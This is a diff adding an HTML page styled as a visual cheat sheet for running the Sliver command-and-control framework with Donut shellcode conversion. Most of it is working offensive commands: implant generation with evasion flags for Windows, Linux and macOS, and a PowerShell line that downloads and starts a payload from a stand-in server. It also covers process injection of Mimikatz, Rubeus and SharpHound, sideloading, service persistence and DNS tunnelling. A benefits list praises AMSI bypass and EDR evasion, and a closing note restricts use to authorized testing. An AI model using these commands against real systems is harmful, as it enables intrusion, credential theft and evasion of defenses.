@@ -1,0 +1,697 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sliver + Donut Integration Guide</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Courier New', monospace;
+            background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 100%);
+            color: #00ff41;
+            padding: 20px;
+            min-height: 100vh;
+        }
+        
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+        
+        h1 {
+            text-align: center;
+            font-size: 2.5em;
+            margin-bottom: 10px;
+            text-shadow: 0 0 10px #00ff41;
+            color: #00ff41;
+        }
+        
+        .subtitle {
+            text-align: center;
+            color: #00d9ff;
+            margin-bottom: 40px;
+            font-size: 1.1em;
+        }
+        
+        .workflow-section {
+            background: rgba(0, 255, 65, 0.05);
+            border: 2px solid #00ff41;
+            border-radius: 10px;
+            padding: 30px;
+            margin-bottom: 30px;
+            box-shadow: 0 0 20px rgba(0, 255, 65, 0.2);
+        }
+        
+        .section-title {
+            font-size: 1.8em;
+            margin-bottom: 25px;
+            color: #00d9ff;
+            border-bottom: 2px solid #00d9ff;
+            padding-bottom: 10px;
+        }
+        
+        .flow-container {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        
+        .flow-box {
+            background: rgba(0, 217, 255, 0.1);
+            border: 2px solid #00d9ff;
+            border-radius: 8px;
+            padding: 20px;
+            min-width: 200px;
+            flex: 1;
+            position: relative;
+            transition: all 0.3s ease;
+        }
+        
+        .flow-box:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 5px 20px rgba(0, 217, 255, 0.4);
+        }
+        
+        .flow-box-title {
+            font-weight: bold;
+            color: #00d9ff;
+            margin-bottom: 10px;
+            font-size: 1.1em;
+        }
+        
+        .flow-arrow {
+            color: #ff6b35;
+            font-size: 2em;
+            font-weight: bold;
+            align-self: center;
+        }
+        
+        .code-block {
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid #00ff41;
+            border-radius: 5px;
+            padding: 15px;
+            margin: 10px 0;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+            overflow-x: auto;
+            color: #00ff41;
+        }
+        
+        .command {
+            color: #ff6b35;
+            font-weight: bold;
+        }
+        
+        .example-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
+            gap: 20px;
+            margin-top: 20px;
+        }
+        
+        .example-card {
+            background: rgba(0, 0, 0, 0.3);
+            border: 2px solid #ff6b35;
+            border-radius: 8px;
+            padding: 20px;
+            transition: all 0.3s ease;
+        }
+        
+        .example-card:hover {
+            border-color: #00ff41;
+            box-shadow: 0 0 15px rgba(255, 107, 53, 0.3);
+        }
+        
+        .example-title {
+            color: #ff6b35;
+            font-size: 1.3em;
+            margin-bottom: 15px;
+            font-weight: bold;
+        }
+        
+        .benefit-list {
+            list-style: none;
+            margin-top: 15px;
+        }
+        
+        .benefit-list li {
+            padding: 8px 0;
+            padding-left: 25px;
+            position: relative;
+        }
+        
+        .benefit-list li:before {
+            content: "▸";
+            position: absolute;
+            left: 0;
+            color: #ff6b35;
+            font-weight: bold;
+        }
+        
+        .warning-box {
+            background: rgba(255, 107, 53, 0.1);
+            border: 2px solid #ff6b35;
+            border-radius: 8px;
+            padding: 20px;
+            margin-top: 30px;
+        }
+        
+        .warning-title {
+            color: #ff6b35;
+            font-size: 1.3em;
+            margin-bottom: 10px;
+            font-weight: bold;
+        }
+        
+        .technique-badge {
+            display: inline-block;
+            background: rgba(0, 217, 255, 0.2);
+            color: #00d9ff;
+            padding: 5px 12px;
+            border-radius: 15px;
+            font-size: 0.85em;
+            margin: 5px 5px 5px 0;
+            border: 1px solid #00d9ff;
+        }
+        
+        @media (max-width: 768px) {
+            .flow-container {
+                flex-direction: column;
+            }
+            
+            .flow-arrow {
+                transform: rotate(90deg);
+            }
+            
+            .example-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🛡️ SLIVER + DONUT INTEGRATION 🛡️</h1>
+        <p class="subtitle">Complete Visual Guide to C2 Shellcode Generation & In-Memory Execution</p>
+        
+        <!-- Basic Workflow -->
+        <div class="workflow-section">
+            <div class="section-title">📋 Basic Workflow</div>
+            <div class="flow-container">
+                <div class="flow-box">
+                    <div class="flow-box-title">1. Generate Sliver Implant</div>
+                    <div class="code-block">
+                        <span class="command">sliver ></span> generate --mtls c2.server.com:443 --os windows --arch amd64 --format shellcode --save implant.bin
+                    </div>
+                </div>
+                
+                <div class="flow-arrow">→</div>
+                
+                <div class="flow-box">
+                    <div class="flow-box-title">2. Optional: Donut Conversion</div>
+                    <div class="code-block">
+                        <span class="command">$</span> donut -a 2 -f tool.exe -o shellcode.bin
+                    </div>
+                </div>
+                
+                <div class="flow-arrow">→</div>
+                
+                <div class="flow-box">
+                    <div class="flow-box-title">3. Execute in Memory</div>
+                    <div class="code-block">
+                        <span class="command">sliver (session) ></span> execute-shellcode -p 1234 shellcode.bin
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Beacon Deployment Workflow -->
+        <div class="workflow-section">
+            <div class="section-title">🚀 Complete Beacon Deployment Workflow</div>
+            
+            <div class="example-card" style="margin-bottom: 20px;">
+                <div class="example-title">Step-by-Step Beacon Deployment via HTTP</div>
+                <div class="technique-badge">Beacon C2</div>
+                <div class="technique-badge">HTTP Delivery</div>
+                <div class="technique-badge">Website Hosting</div>
+                
+                <div class="code-block">
+<span class="command"># Step 1: Generate beacon with evasion</span>
+sliver > generate beacon --http your-server.com:8443 --os windows --evasion --save /path/to/file/
+
+<span class="command"># Step 2: Start C2 listener</span>
+sliver > http --lhost 0.0.0.0 --lport 8443
+
+<span class="command"># Step 3: Add payload to website</span>
+sliver > websites add-content --website mysite --web-path /download/update.exe 
+         --content /path/to/file/ACTUAL_FILENAME.exe 
+         --content-type application/octet-stream
+
+<span class="command"># Step 4: Start website server (on different port)</span>
+sliver > http --website mysite --lhost 0.0.0.0 --lport 80
+
+<span class="command"># Step 5: Execute on target</span>
+PowerShell command:
+(New-Object System.Net.WebClient).DownloadFile('http://your-server.com:80/download/update.exe', 
+"$env:TEMP\update.exe"); Start-Process "$env:TEMP\update.exe"
+
+<span class="command"># Step 6: Wait for beacon callback</span>
+sliver > beacons
+
+<span class="command"># Step 7: Interact with beacon</span>
+sliver > use [beacon-id]
+                </div>
+                
+                <p style="color: #00d9ff; margin-top: 15px; line-height: 1.6;">
+                    <strong>Key Points:</strong><br>
+                    • C2 listener (8443) and website server (80) run on different ports<br>
+                    • Beacons use asynchronous communication (check-in intervals)<br>
+                    • Website hosting allows legitimate-looking payload delivery<br>
+                    • Evasion flag enables built-in anti-detection techniques
+                </p>
+            </div>
+        </div>
+        
+        <!-- Practical Examples -->
+        <div class="workflow-section">
+            <div class="section-title">🎯 Practical Examples</div>
+            
+            <div class="example-grid">
+                <!-- Example 1 -->
+                <div class="example-card">
+                    <div class="example-title">Example 1: Mimikatz Execution</div>
+                    <div class="technique-badge">Credential Dumping</div>
+                    <div class="technique-badge">Process Injection</div>
+                    
+                    <div class="code-block">
+<span class="command"># Step 1: Convert Mimikatz to shellcode</span>
+$ donut -a 2 -f mimikatz.exe -o mimikatz.bin
+
+<span class="command"># Step 2: Find target process</span>
+sliver (session) > ps
+
+<span class="command"># Step 3: Inject into process</span>
+sliver (session) > execute-shellcode -p 4532 mimikatz.bin
+                    </div>
+                </div>
+                
+                <!-- Example 2 -->
+                <div class="example-card">
+                    <div class="example-title">Example 2: Rubeus with Parameters</div>
+                    <div class="technique-badge">Kerberoasting</div>
+                    <div class="technique-badge">.NET Assembly</div>
+                    
+                    <div class="code-block">
+<span class="command"># Convert with arguments</span>
+$ donut -a 2 -f Rubeus.exe \
+  -p "kerberoast /outfile:hashes.txt" \
+  -o rubeus.bin
+
+<span class="command"># Execute in target session</span>
+sliver (session) > execute-shellcode rubeus.bin
+                    </div>
+                </div>
+                
+                <!-- Example 3 -->
+                <div class="example-card">
+                    <div class="example-title">Example 3: Sacrificial Process</div>
+                    <div class="technique-badge">Process Hollowing</div>
+                    <div class="technique-badge">Evasion</div>
+                    
+                    <div class="code-block">
+<span class="command"># Spawn new process and inject</span>
+sliver (session) > spawndll \
+  -p C:\\Windows\\System32\\notepad.exe \
+  /path/to/shellcode.bin
+
+<span class="command"># Alternative: Sideload into legitimate process</span>
+sliver (session) > sideload -p 2048 \
+  -e RunMe /path/to/payload.dll
+                    </div>
+                </div>
+                
+                <!-- Example 4 -->
+                <div class="example-card">
+                    <div class="example-title">Example 4: SharpHound Collection</div>
+                    <div class="technique-badge">Active Directory</div>
+                    <div class="technique-badge">Enumeration</div>
+                    
+                    <div class="code-block">
+<span class="command"># Convert SharpHound</span>
+$ donut -a 2 -f SharpHound.exe \
+  -p "-c All -d domain.local" \
+  -o sharphound.bin
+
+<span class="command"># Execute enumeration</span>
+sliver (session) > execute-shellcode \
+  --rwx-pages sharphound.bin
+                    </div>
+                </div>
+                
+                <!-- Example 5 -->
+                <div class="example-card">
+                    <div class="example-title">Example 5: Seatbelt Security Audit</div>
+                    <div class="technique-badge">Host Reconnaissance</div>
+                    <div class="technique-badge">Situational Awareness</div>
+                    
+                    <div class="code-block">
+<span class="command"># Generate Seatbelt shellcode</span>
+$ donut -a 2 -f Seatbelt.exe \
+  -p "All -full" \
+  -o seatbelt.bin
+
+<span class="command"># Run full security checks</span>
+sliver (session) > execute-shellcode seatbelt.bin
+                    </div>
+                </div>
+                
+                <!-- Example 6 -->
+                <div class="example-card">
+                    <div class="example-title">Example 6: Multi-Stage Deployment</div>
+                    <div class="technique-badge">Staged Payload</div>
+                    <div class="technique-badge">Automation</div>
+                    
+                    <div class="code-block">
+<span class="command"># Automation script</span>
+#!/bin/bash
+
+# Generate Sliver implant
+sliver generate --mtls c2.com:443 \
+  --format shellcode --save stage1.bin
+
+# Convert post-ex tool
+donut -a 2 -f tool.exe -o stage2.bin
+
+# Deploy via preferred method
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Injection Techniques -->
+        <div class="workflow-section">
+            <div class="section-title">💉 Injection Techniques</div>
+            
+            <div class="flow-container" style="justify-content: space-around;">
+                <div class="flow-box" style="flex: 0 1 calc(33% - 20px);">
+                    <div class="flow-box-title">Process Injection</div>
+                    <div class="code-block">
+execute-shellcode -p &lt;pid&gt; shellcode.bin
+                    </div>
+                </div>
+                
+                <div class="flow-box" style="flex: 0 1 calc(33% - 20px);">
+                    <div class="flow-box-title">RWX Pages</div>
+                    <div class="code-block">
+execute-shellcode --rwx-pages shellcode.bin
+                    </div>
+                </div>
+                
+                <div class="flow-box" style="flex: 0 1 calc(33% - 20px);">
+                    <div class="flow-box-title">Named Process</div>
+                    <div class="code-block">
+execute-shellcode --process-name explorer.exe
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Key Benefits -->
+        <div class="workflow-section">
+            <div class="section-title">✨ Key Benefits</div>
+            <ul class="benefit-list">
+                <li><strong>In-Memory Execution:</strong> No files touch disk, reducing forensic artifacts</li>
+                <li><strong>.NET Assembly Support:</strong> Run C# tools without compilation issues</li>
+                <li><strong>AMSI Bypass:</strong> Donut includes built-in AMSI patching capabilities</li>
+                <li><strong>Process Flexibility:</strong> Inject into any process for better OpSec</li>
+                <li><strong>EDR Evasion:</strong> Harder to detect than traditional file-based execution</li>
+                <li><strong>Position Independent:</strong> Shellcode can run anywhere in memory</li>
+                <li><strong>Cross-Platform:</strong> Support for Windows, Linux, and macOS targets</li>
+            </ul>
+        </div>
+        
+        <!-- Complete Generate Options -->
+        <div class="workflow-section">
+            <div class="section-title">🔧 Complete Generate Options</div>
+            
+            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; margin-bottom: 30px;">
+                <div class="flow-box">
+                    <div class="flow-box-title">Operating Systems</div>
+                    <div class="code-block">
+--os windows
+--os linux
+--os darwin    <span style="color: #666;"># macOS</span>
+                    </div>
+                </div>
+                
+                <div class="flow-box">
+                    <div class="flow-box-title">Architectures</div>
+                    <div class="code-block">
+--arch amd64   <span style="color: #666;"># 64-bit</span>
+--arch 386     <span style="color: #666;"># 32-bit</span>
+--arch arm64   <span style="color: #666;"># ARM 64-bit</span>
+--arch arm     <span style="color: #666;"># ARM 32-bit</span>
+                    </div>
+                </div>
+                
+                <div class="flow-box">
+                    <div class="flow-box-title">Format Options</div>
+                    <div class="code-block">
+--format exe
+--format shared     <span style="color: #666;"># .dll/.so</span>
+--format shellcode  <span style="color: #666;"># raw</span>
+--format service    <span style="color: #666;"># Windows</span>
+                    </div>
+                </div>
+            </div>
+            
+            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px;">
+                <div class="flow-box">
+                    <div class="flow-box-title">Connection Types</div>
+                    <div class="code-block">
+--mtls host:port
+--wg host:port     <span style="color: #666;"># WireGuard</span>
+--http host:port
+--https host:port
+--dns host
+                    </div>
+                </div>
+                
+                <div class="flow-box">
+                    <div class="flow-box-title">Additional Flags</div>
+                    <div class="code-block">
+--evasion          <span style="color: #666;"># Enable evasion</span>
+--skip-symbols     <span style="color: #666;"># Strip symbols</span>
+--debug            <span style="color: #666;"># Debug build</span>
+--save path        <span style="color: #666;"># Save location</span>
+--name custom      <span style="color: #666;"># Custom name</span>
+                    </div>
+                </div>
+                
+                <div class="flow-box">
+                    <div class="flow-box-title">Donut Architecture</div>
+                    <div class="code-block">
+-a 1    <span style="color: #666;"># x86 (32-bit)</span>
+-a 2    <span style="color: #666;"># x64 (64-bit)</span>
+-a 3    <span style="color: #666;"># x86+x64 (dual)</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Windows Generation Examples -->
+        <div class="workflow-section">
+            <div class="section-title">🪟 Windows Generation Examples</div>
+            
+            <div class="example-card" style="margin-bottom: 20px;">
+                <div class="example-title">Standard Windows Executable with Evasion</div>
+                <div class="technique-badge">Executable</div>
+                <div class="technique-badge">Evasion Enabled</div>
+                <div class="code-block">
+<span class="command">sliver ></span> generate --mtls your-server.com:443 --os windows --arch amd64 --evasion
+                </div>
+                <p style="color: #00d9ff; margin-top: 10px;">Creates a standard Windows .exe with built-in evasion techniques</p>
+            </div>
+            
+            <div class="example-card" style="margin-bottom: 20px;">
+                <div class="example-title">Windows Shared Library (DLL)</div>
+                <div class="technique-badge">DLL</div>
+                <div class="technique-badge">Reflective Loading</div>
+                <div class="code-block">
+<span class="command">sliver ></span> generate --mtls your-server.com:443 --os windows --arch amd64 --format shared --evasion
+                </div>
+                <p style="color: #00d9ff; margin-top: 10px;">Generates a .dll for DLL injection, sideloading, or reflective loading techniques</p>
+            </div>
+            
+            <div class="example-card" style="margin-bottom: 20px;">
+                <div class="example-title">Windows Shellcode</div>
+                <div class="technique-badge">Shellcode</div>
+                <div class="technique-badge">Position Independent</div>
+                <div class="code-block">
+<span class="command">sliver ></span> generate --mtls your-server.com:443 --os windows --arch amd64 --format shellcode --save payload.bin
+                </div>
+                <p style="color: #00d9ff; margin-top: 10px;">Raw shellcode for custom loaders, process injection, or Donut conversion</p>
+            </div>
+            
+            <div class="example-card" style="margin-bottom: 20px;">
+                <div class="example-title">Windows Service Binary</div>
+                <div class="technique-badge">Service</div>
+                <div class="technique-badge">Persistence</div>
+                <div class="code-block">
+<span class="command">sliver ></span> generate --mtls your-server.com:443 --os windows --arch amd64 --format service --save service.exe
+                </div>
+                <p style="color: #00d9ff; margin-top: 10px;">Service-compatible binary for Windows service persistence mechanisms</p>
+            </div>
+            
+            <div class="example-card">
+                <div class="example-title">Windows 32-bit for Legacy Systems</div>
+                <div class="technique-badge">x86</div>
+                <div class="technique-badge">Legacy Support</div>
+                <div class="code-block">
+<span class="command">sliver ></span> generate --mtls your-server.com:443 --os windows --arch 386 --evasion --save payload_x86.exe
+                </div>
+                <p style="color: #00d9ff; margin-top: 10px;">32-bit implant for older Windows systems or WoW64 execution</p>
+            </div>
+        </div>
+        
+        <!-- Linux Generation Examples -->
+        <div class="workflow-section">
+            <div class="section-title">🐧 Linux Generation Examples</div>
+            
+            <div class="example-card" style="margin-bottom: 20px;">
+                <div class="example-title">Standard Linux ELF Binary</div>
+                <div class="technique-badge">ELF</div>
+                <div class="technique-badge">x64</div>
+                <div class="code-block">
+<span class="command">sliver ></span> generate --mtls your-server.com:443 --os linux --arch amd64 --save linux_implant
+                </div>
+                <p style="color: #00d9ff; margin-top: 10px;">Standard 64-bit Linux executable for modern systems</p>
+            </div>
+            
+            <div class="example-card" style="margin-bottom: 20px;">
+                <div class="example-title">Linux Shared Object (.so)</div>
+                <div class="technique-badge">Shared Library</div>
+                <div class="technique-badge">LD_PRELOAD</div>
+                <div class="code-block">
+<span class="command">sliver ></span> generate --mtls your-server.com:443 --os linux --arch amd64 --format shared --save implant.so
+                </div>
+                <p style="color: #00d9ff; margin-top: 10px;">Shared library for LD_PRELOAD hijacking or library injection techniques</p>
+            </div>
+            
+            
+            
+                    </div>
+        
+        <!-- macOS Generation Examples -->
+        <div class="workflow-section">
+            <div class="section-title">🍎 macOS Generation Examples</div>
+            
+            <div class="example-card" style="margin-bottom: 20px;">
+                <div class="example-title">macOS Mach-O Binary</div>
+                <div class="technique-badge">Mach-O</div>
+                <div class="technique-badge">x64</div>
+                <div class="code-block">
+<span class="command">sliver ></span> generate --mtls your-server.com:443 --os darwin --arch amd64 --save macos_implant
+                </div>
+                <p style="color: #00d9ff; margin-top: 10px;">Standard macOS executable for Intel-based Macs</p>
+            </div>
+            
+            <div class="example-card" style="margin-bottom: 20px;">
+                <div class="example-title">macOS ARM64 (Apple Silicon)</div>
+                <div class="technique-badge">ARM64</div>
+                <div class="technique-badge">M1/M2/M3</div>
+                <div class="code-block">
+<span class="command">sliver ></span> generate --mtls your-server.com:443 --os darwin --arch arm64 --save macos_m1_implant
+                </div>
+                <p style="color: #00d9ff; margin-top: 10px;">Native ARM64 implant for Apple Silicon (M1, M2, M3) Macs</p>
+            </div>
+            
+            <div class="example-card">
+                <div class="example-title">macOS Dylib (Dynamic Library)</div>
+                <div class="technique-badge">Dylib</div>
+                <div class="technique-badge">Library Injection</div>
+                <div class="code-block">
+<span class="command">sliver ></span> generate --mtls your-server.com:443 --os darwin --arch amd64 --format shared --save implant.dylib
+                </div>
+                <p style="color: #00d9ff; margin-top: 10px;">Dynamic library for DYLD_INSERT_LIBRARIES injection on macOS</p>
+            </div>
+        </div>
+        
+        <!-- Advanced Generation Patterns -->
+        <div class="workflow-section">
+            <div class="section-title">🚀 Advanced Generation Patterns</div>
+            
+            <div class="example-grid">
+                <div class="example-card">
+                    <div class="example-title">HTTP/HTTPS C2</div>
+                    <div class="code-block">
+<span class="command"># HTTP</span>
+generate --http your-server.com:80 --os windows --arch amd64
+
+<span class="command"># HTTPS</span>
+generate --https your-server.com:443 --os windows --arch amd64
+                    </div>
+                </div>
+                
+                <div class="example-card">
+                    <div class="example-title">DNS C2</div>
+                    <div class="code-block">
+<span class="command"># DNS tunneling</span>
+generate --dns your-server.com --os windows --arch amd64
+                    </div>
+                </div>
+                
+                <div class="example-card">
+                    <div class="example-title">WireGuard C2</div>
+                    <div class="code-block">
+<span class="command"># WireGuard VPN</span>
+generate --wg your-server.com:51820 --os linux --arch amd64
+                    </div>
+                </div>
+                
+                <div class="example-card">
+                    <div class="example-title">Multi-Protocol</div>
+                    <div class="code-block">
+<span class="command"># Multiple protocols</span>
+generate --mtls srv.com:443 --http srv.com:80 --dns srv.com --os windows --arch amd64
+                    </div>
+                </div>
+                
+                <div class="example-card">
+                    <div class="example-title">Custom Named Implant</div>
+                    <div class="code-block">
+<span class="command"># Custom identifier</span>
+generate --name "FINANCE_SERVER_01" --mtls your-server.com:443 --os windows --arch amd64
+                    </div>
+                </div>
+                
+                <div class="example-card">
+                    <div class="example-title">Debug Build</div>
+                    <div class="code-block">
+<span class="command"># With debug symbols</span>
+generate --mtls your-server.com:443 --debug --os linux --arch amd64
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Warning Box -->
+        <div class="warning-box">
+            <div class="warning-title">⚠️ Legal & Ethical Considerations</div>
+            <p style="line-height: 1.6; color: #00ff41;">
+                These techniques should ONLY be used in authorized penetration testing environments with proper written consent. Unauthorized access to computer systems is illegal under laws like the Computer Fraud and Abuse Act (CFAA) and similar legislation worldwide. Always practice in controlled lab environments like HackTheBox, TryHackMe, or your own isolated networks.
+            </p>
+        </div>
+    </div>
+</body>
+</html>
